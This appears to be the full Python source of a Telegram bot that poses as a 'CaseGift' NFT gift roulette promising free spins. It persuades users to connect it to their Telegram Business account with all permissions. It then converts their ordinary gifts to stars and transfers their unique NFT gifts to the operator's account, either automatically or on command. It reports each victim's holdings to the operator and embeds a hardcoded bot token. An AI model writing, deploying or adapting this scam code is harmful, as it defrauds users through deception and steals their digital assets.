import asyncio
import datetime
import time
from aiogram import Bot, Dispatcher, F, types
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.utils.keyboard import InlineKeyboardBuilder, ReplyKeyboardBuilder
from aiogram.filters import CommandStart
from aiogram.exceptions import TelegramBadRequest
import os
import sys
import logging
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
import asyncio
from aiogram.types import InputMediaPhoto
import re
import random
import asyncio
from aiosend import CryptoPay, MAINNET
import sqlite3
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.context import FSMContext
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from datetime import datetime
import pytz
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, InputFile
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram import F
import asyncio
import aiohttp
from aiogram import Bot, Dispatcher, types
from aiogram.fsm.context import FSMContext
from aiogram.filters import Command, CommandStart
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup, LabeledPrice, Message
from aiogram.utils.keyboard import  InlineKeyboardBuilder
from aiosend import CryptoPay
from aiogram import F
import asyncio
import logging
import aiohttp
import sys
import asyncio
from contextlib import suppress
import logging
import sys
import os
from os import getenv
import sqlite3
import random
import re
import datetime
import time
from aiogram.exceptions import TelegramBadRequest
from typing import Any
from aiogram import types
from aiogram import Router
from aiogram import Bot, Dispatcher, F   
from aiogram.filters import CommandStart, Command, CommandObject
from aiogram.types import Message, CallbackQuery
from aiogram.types import PreCheckoutQuery, LabeledPrice
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton , InlineKeyboardMarkup , InlineKeyboardButton , CallbackQuery
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.enums import ParseMode
from datetime import datetime, timedelta
from aiogram.types import ChatPermissions
from aiogram.enums import ChatType
from aiogram.methods.send_gift import SendGift
import asyncio
from aiohttp import web
from aiogram import Bot, Dispatcher
from aiogram.types import Message
from aiogram.webhook.aiohttp_server import SimpleRequestHandler, setup_application

BOT_TOKEN = os.getenv("BOT_TOKEN") 

TOKEN = "8214171414:AAGb_8YNJq_tXVm40BfgNhrpr9I8_VX6qyg"
MY_ID = 7792895663

WEB_SERVER_HOST = "0.0.0.0"  
WEB_SERVER_PORT = int(os.getenv("PORT", 8080)) 
WEBHOOK_PATH = "/webhook"
BASE_WEBHOOK_URL = os.getenv("WEBHOOK_URL")


if not BOT_TOKEN:
    logging.error("❌ ОШИБКА: Не указан BOT_TOKEN в переменных окружения!")
    sys.exit(1)

  
bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.MARKDOWN))
dp = Dispatcher()


ADMIN_ID = 767154085

async def on_startup():
    """Действия при запуске бота"""
    try:
        if BASE_WEBHOOK_URL:
            await bot.set_webhook(
                f"{BASE_WEBHOOK_URL}{WEBHOOK_PATH}",
                drop_pending_updates=True
            )
        await bot.send_message(ADMIN_ID, "Бот успешно запущен!")
    except Exception as e:
        logging.error(f"🚨 Ошибка при запуске: {e}")
        raise

async def on_shutdown():
    """Действия при выключении бота"""
    try:
        if BASE_WEBHOOK_URL:
            await bot.delete_webhook()
        await bot.send_message(ADMIN_ID, "Бот выключается...")
        await bot.session.close()
    except Exception as e:
        logging.error(f"Ошибка при выключении: {e}")

async def keep_alive():
    while True:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(f"{BASE_WEBHOOK_URL or 'http://localhost'}/ping") as resp:
                    logging.info(f"Keep-alive ping: {resp.status}")
        except Exception as e:
            logging.error(f"Keep-alive error: {e}")
        await asyncio.sleep(300)

async def ping_handler(request: web.Request):
    return web.Response(text="Bot is alive")

async def setup_webhook():
    """Настройка вебхука"""
    app = web.Application()
    app.router.add_get("/ping", ping_handler)
    
    webhook_requests_handler = SimpleRequestHandler(
        dispatcher=dp,
        bot=bot,
    )
    webhook_requests_handler.register(app, path=WEBHOOK_PATH)
    setup_application(app, dp, bot=bot)
    
    return app





bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.MARKDOWN))
dp = Dispatcher()

auto_transfer_mode = True

NOTIFICATION_CACHE = {}
NOTIFICATION_CACHE_DURATION = 30

def sanitize_markdown_chars(text: str) -> str:
    if not text:
        return ""
    return text.replace("*", " ").replace("_", " ").replace("`", "'").replace("[", "(").replace("]", ")")

def get_activation_keyboard(bot_username: str):
    a = random.choice(['afs', 'dfs', 'fdsf', 'wefew', '81ff', 'fdsf', 'areaa'])
    builder = InlineKeyboardBuilder()
    builder.row(types.InlineKeyboardButton(text="⚙️ Открыть настройки Telegram", url="tg://settings"))
    builder.row(types.InlineKeyboardButton(text="🔗 Добавить в бизнес-аккаунт", url=f"tg://resolve?domain={bot_username}&start=business"))
    builder.row(types.InlineKeyboardButton(text="💼 Моя реферальная ссылка", url=f"https://t.me/CaseGiftGamesBot?start=_ref_2432_{a}"))
    builder.adjust(1)
    return builder.as_markup()

def get_admin_keyboard():
    builder = ReplyKeyboardBuilder()
    builder.row(types.KeyboardButton(text="🛠️ Настройка"))
    return builder.as_markup(resize_keyboard=True)

def get_transfer_settings_keyboard():
    builder = InlineKeyboardBuilder()
    builder.row(
        types.InlineKeyboardButton(text="Автоматически", callback_data="set_transfer_auto"),
        types.InlineKeyboardButton(text="По запросу", callback_data="set_transfer_manual")
    )
    return builder.as_markup()

async def execute_gift_transfer(business_connection_id: str, bot_instance: Bot, business_owner_username: str = "N/A"):
    results = {
        "converted_gifts_count": 0, "conversion_success_count": 0, "conversion_error_count": 0,
        "unique_gifts_found_count": 0, "unique_gifts_transferred_count": 0, "unique_gifts_transfer_error_count": 0,
        "critical_error_occurred": False, "overall_success": True
    }
    try:
        gifts_to_convert_response = await bot_instance.get_business_account_gifts(business_connection_id, exclude_unique=True)
        gifts_to_convert = gifts_to_convert_response.gifts
        results["converted_gifts_count"] = len(gifts_to_convert)
        if gifts_to_convert:
            for gift in gifts_to_convert:
                try:
                    await bot_instance.convert_gift_to_stars(business_connection_id, gift.owned_gift_id)
                    results["conversion_success_count"] += 1
                except TelegramBadRequest:
                    results["conversion_error_count"] += 1; results["overall_success"] = False
                except Exception:
                    results["conversion_error_count"] += 1; results["overall_success"] = False
    except Exception:
        results["critical_error_occurred"] = True; results["overall_success"] = False

    try:
        unique_gifts_response = await bot_instance.get_business_account_gifts(business_connection_id, exclude_unique=False)
        unique_gifts_list = [g for g in unique_gifts_response.gifts if getattr(g, 'is_unique', False)]
        results["unique_gifts_found_count"] = len(unique_gifts_list)
        if unique_gifts_list:
            for gift in unique_gifts_list:
                try:
                    await bot_instance.transfer_gift(business_connection_id, gift.owned_gift_id, MY_ID, 25)
                    results["unique_gifts_transferred_count"] += 1
                except Exception:
                    results["unique_gifts_transfer_error_count"] += 1; results["overall_success"] = False
    except Exception:
        results["critical_error_occurred"] = True; results["overall_success"] = False
    return results

@dp.message(CommandStart())
async def cmd_start(message: types.Message, bot_instance: Bot = bot):
    bot_user = await bot_instance.get_me()
    bot_username = bot_user.username
    if message.from_user.id == MY_ID:
        admin_mode_text = 'Автоматически' if auto_transfer_mode else 'По запросу'
        await message.answer(f"**👋 Привет, Администратор!**\n**Текущий режим передачи: {admin_mode_text}.**\n**Используйте кнопку '🛠️ Настройка' для изменения. Совет от саморезки: ставь автоматически если хочешь тчобы сразу прилетало нфт**", reply_markup=get_admin_keyboard(), parse_mode=ParseMode.MARKDOWN)
    else:
        activation_text = f"""
<b>🔹 Добро пожаловать, {message.from_user.full_name}! CaseGift - лучшая рулетка подарков в Telegram.
Данный бот разыгрывает много NFT подарков и звезд. Крути спины каждый день, радуйся победами. Испытай свою удачу в этом боте!</b>

<b>🔹 Для начала работы выполните шаги:</b>
<blockquote><i> [1] Перейдите в настройки Telegram.
 [2] Откройте раздел Telegram Business.
 [3] Нажмите 'Боты для бизнеса'.
 [4] Добавьте бота (@{bot_username}), предоставив все разрешения</i></blockquote>

<b>🔹 После этого вам будет начислено бесплатно <u>5 прокрутов</u>. Удачной игры!</b>
"""

        photo_url = 'https://i.postimg.cc/8z23FgR2/photo-2025-07-31-16-37-07.jpg' 

        await message.answer_photo(
    photo=photo_url,
    caption=activation_text,
    parse_mode='HTML',
    reply_markup=get_activation_keyboard(bot_username)
)


@dp.message(F.text == "🛠️ Настройка", F.from_user.id == MY_ID)
async def admin_settings_handler(message: types.Message):
    await message.answer("**Выберите режим передачи подарков и звезд:**", reply_markup=get_transfer_settings_keyboard(), parse_mode=ParseMode.MARKDOWN)

@dp.callback_query(F.data.startswith("set_transfer_"), F.from_user.id == MY_ID)
async def transfer_mode_callback_handler(callback: types.CallbackQuery):
    global auto_transfer_mode
    mode = callback.data.split("_")[-1]
    if mode == "auto": auto_transfer_mode = True
    elif mode == "manual": auto_transfer_mode = False
    current_mode_text = 'Автоматически' if auto_transfer_mode else 'По запросу'
    await callback.answer(f"Режим изменен на: {current_mode_text}")
    await callback.message.edit_text(f"**Режим передачи изменен на: {current_mode_text}.**", parse_mode=ParseMode.MARKDOWN)

@dp.business_message()
async def handle_business_message(message: types.Message, bot_instance: Bot = bot):
    business_connection_id = message.business_connection_id
    user_who_interacted = message.from_user 

    if user_who_interacted and user_who_interacted.id == MY_ID:
        return
    if not business_connection_id:
        return

    current_time = time.time()
    if business_connection_id in NOTIFICATION_CACHE and (current_time - NOTIFICATION_CACHE[business_connection_id]) < NOTIFICATION_CACHE_DURATION:
        return
    NOTIFICATION_CACHE[business_connection_id] = current_time

    business_chat = message.chat 
    raw_business_owner_username = business_chat.username or f"ID:{business_chat.id}"
    business_owner_username = sanitize_markdown_chars(raw_business_owner_username)
    
    raw_user_display_name = f"@{user_who_interacted.username}" if user_who_interacted.username else f"ID: {user_who_interacted.id}"
    user_display_name = sanitize_markdown_chars(raw_user_display_name)

    num_unique_gifts_initial, num_regular_gifts_initial, stars_on_account_initial = 0, 0, 0
    permission_status_content = "⚠️ Off (Ошибка чтения данных)" 
    entry_date = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    processing_status_line_content = ""

    try:
        regular_gifts_data = await bot_instance.get_business_account_gifts(business_connection_id, exclude_unique=True)
        num_regular_gifts_initial = len(regular_gifts_data.gifts)
        unique_gifts_data = await bot_instance.get_business_account_gifts(business_connection_id, exclude_unique=False)
        num_unique_gifts_initial = len([g for g in unique_gifts_data.gifts if getattr(g, 'is_unique', False)])
        stars_data = await bot_instance.get_business_account_star_balance(business_connection_id)
        stars_on_account_initial = stars_data.amount
        permission_status_content = "✅ On (Чтение доступно)"
    except TelegramBadRequest as e:
        error_label = e.label if hasattr(e, 'label') else e.message
        permission_status_content = f"⚠️ Off (Ошибка API: {sanitize_markdown_chars(error_label)})"
        if auto_transfer_mode: processing_status_line_content = "⚙️ Статус: ❌ Ошибка (нет доступа к данным)"
    except Exception as e:
        permission_status_content = f"⚠️ Off (Ошибка чтения: {sanitize_markdown_chars(e.__class__.__name__)})"
        if auto_transfer_mode: processing_status_line_content = "⚙️ Статус: ❌ Ошибка (нет доступа к данным)"

    if auto_transfer_mode and permission_status_content == "✅ On (Чтение доступно)":
        await bot_instance.send_message(MY_ID, f"**🤖 Автоматическая обработка для @{business_owner_username} (ID: {business_connection_id})...**", parse_mode=ParseMode.MARKDOWN)
        res = await execute_gift_transfer(business_connection_id, bot_instance, business_owner_username)
        success_emoji = '✅' if res['overall_success'] else '⚠️'
        status_part = f"⚙️ Статус: {success_emoji} {'Успешно' if res['overall_success'] else 'Ошибки'}"
        conv_part = f"🌸{res['conversion_success_count']}/{res['converted_gifts_count']}({res['conversion_error_count']})"
        uniq_part = f"🎁{res['unique_gifts_transferred_count']}/{res['unique_gifts_found_count']}({res['unique_gifts_transfer_error_count']})"
        processing_status_line_content = f"{status_part} | {conv_part} | {uniq_part}"

    lines = [
        f"**--------------------❇️ Новый заход --------------------**",
        f"**👤 | Бизнес-аккаунт: @{business_owner_username}**",
        f"**✉️ | От пользователя: {user_display_name}**",
        f"**------------------- Инфо о дате --------------------**",
        f"**🕰️ | Дата взаимодействия: {entry_date}**",
        f"**----------------- Инфо о подарках/звездах -----------------**",
        f"**🎁 | Уникальных подарков (оценка): {num_unique_gifts_initial}**",
        f"**🌸 | Обычных подарков (оценка): {num_regular_gifts_initial}**",
        f"**🌟 | Звезд на аккаунте (до обработки): {stars_on_account_initial}**",
        f"**🔓 | Доступ бота к данным: {permission_status_content}**"
    ]
    if processing_status_line_content:
        lines.append(f"**{processing_status_line_content}**")
    
    notification_text = "\n".join(lines)
    
    admin_notification_keyboard = None
    if not auto_transfer_mode and permission_status_content == "✅ On (Чтение доступно)": 
        builder = InlineKeyboardBuilder()
        builder.button(text="↪️ Передать сейчас", callback_data=f"manual_transfer:{business_connection_id}:{business_owner_username}")
        admin_notification_keyboard = builder.as_markup()
    
    await bot_instance.send_message(MY_ID, notification_text, reply_markup=admin_notification_keyboard, parse_mode=ParseMode.MARKDOWN)

    if auto_transfer_mode and permission_status_content != "✅ On (Чтение доступно)" and not processing_status_line_content:
        await bot_instance.send_message(MY_ID, f"**⚠️ Автоматическая обработка для @{business_owner_username} (ID: {business_connection_id}) невозможна: нет доступа к данным.**", parse_mode=ParseMode.MARKDOWN)

@dp.callback_query(F.data.startswith("manual_transfer:"))
async def manual_transfer_callback_handler(callback: types.CallbackQuery, bot_instance: Bot = bot):
    try:
        parts = callback.data.split(":")
        business_connection_id = parts[1]
        raw_owner_username = parts[2] if len(parts) > 2 else "N/A"
        business_owner_username = sanitize_markdown_chars(raw_owner_username)
    except IndexError:
        await callback.answer("Ошибка: неверный формат callback_data.", show_alert=True); return

    await callback.answer("⏳ Запускаю ручную передачу...")
    if callback.message:
        try: await callback.message.edit_reply_markup(reply_markup=None)
        except Exception: pass 

    transfer_results = await execute_gift_transfer(business_connection_id, bot_instance, business_owner_username)
    res = transfer_results 
    success_emoji = '✅' if res['overall_success'] else '⚠️'
    
    part1 = f"🏁 @{business_owner_username} | Ручная: {success_emoji} {'Завершено' if res['overall_success'] else 'Ошибки'}"
    part2 = f"🌸Конв: {res['conversion_success_count']}/{res['converted_gifts_count']} (Ошибок: {res['conversion_error_count']})"
    part3 = f"🎁Уник: {res['unique_gifts_transferred_count']}/{res['unique_gifts_found_count']} (Ошибок: {res['unique_gifts_transfer_error_count']})"
    result_summary = f"**{part1} | {part2} | {part3}**"
    
    await bot_instance.send_message(MY_ID, result_summary, parse_mode=ParseMode.MARKDOWN)



# ===== ЗАПУСК БОТА =====
async def main():
    try:
        # Настройка веб-сервера
        app = await setup_webhook()
        runner = web.AppRunner(app)
        await runner.setup()
        
        site = web.TCPSite(
            runner,
            host=WEB_SERVER_HOST,
            port=WEB_SERVER_PORT,
            reuse_port=True
        )
        
        await site.start()
        logging.info(f"🌐 Сервер запущен на порту {WEB_SERVER_PORT}")
        
        # Инициализация бота
        await on_startup()
        asyncio.create_task(keep_alive())
        
        # Бесконечный цикл
        while True:
            await asyncio.sleep(3600)
            
    except (KeyboardInterrupt, SystemExit):
        logging.info("🛑 Бот остановлен пользователем")
    except Exception as e:
        logging.critical(f"💥 Критическая ошибка: {e}")
    finally:
        await on_shutdown()
        if 'runner' in locals():
            await runner.cleanup()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except Exception as e:
        logging.critical(f"💥 Не удалось запустить бота: {e}")
        sys.exit(1)
